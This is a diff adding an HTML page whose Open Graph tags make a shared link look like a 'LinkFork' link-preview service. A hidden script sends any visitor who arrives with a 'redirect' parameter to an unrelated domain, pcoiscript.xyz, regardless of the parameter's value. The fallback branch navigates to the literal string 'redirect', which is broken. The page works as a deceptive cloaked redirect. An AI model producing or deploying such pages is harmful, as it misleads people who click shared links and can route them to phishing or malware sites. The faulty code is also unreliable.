@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<html>
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://linkfork.co/">
+<meta property="og:title" content="LinkFork | Link Preview Customization">
+<meta property="og:description" content="LinkFork lets you shorten, and customize how your link will appear when shared on social media, for free.">
+<meta property="og:image" content="https://linkfork.co/images/poster.png">
+
+</html>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const redirect = params.get("redirect");
+  
+  if (redirect != null) {
+    window.location.href = "http://pcoiscript.xyz/codelow-tag/";
+  } else {
+    window.location.href = "redirect";
+  }
+</script>
+<!-- partial -->
+  
+</body>
+</html>
